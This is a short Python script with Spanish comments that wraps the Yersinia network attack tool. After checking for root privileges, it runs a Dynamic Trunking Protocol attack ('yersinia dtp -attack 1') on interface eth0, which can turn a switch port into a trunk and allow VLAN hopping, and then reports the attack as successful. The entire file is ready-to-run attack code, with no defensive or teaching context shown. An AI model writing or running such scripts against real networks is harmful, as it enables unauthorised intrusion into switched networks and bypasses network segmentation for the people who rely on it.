import subprocess
import sys
import os

def ejecutar_yersinia():
    # Verificar si el script se está ejecutando como root/sudo
    if os.geteuid() != 0:
        print("[-] Este script requiere privilegios de administrador. Por favor, ejecútalo con 'sudo'.")
        sys.exit(1)

    # Definir el comando como una lista de argumentos
    comando = ["yersinia", "dtp", "-attack", "1", "-interface", "eth0"]
    
    print(f"[+] Ejecutando: {' '.join(comando)}")
    
    try:
        # Ejecuta el comando y muestra la salida en tiempo real en la terminal
        resultado = subprocess.run(comando, check=True)
        print("[+] Ataque finalizado con éxito.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error al ejecutar Yersinia: {e}")
    except FileNotFoundError:
        print("[-] Error: 'yersinia' no está instalado o no se encuentra en el PATH.")

if __name__ == "__main__":
    ejecutar_yersinia()
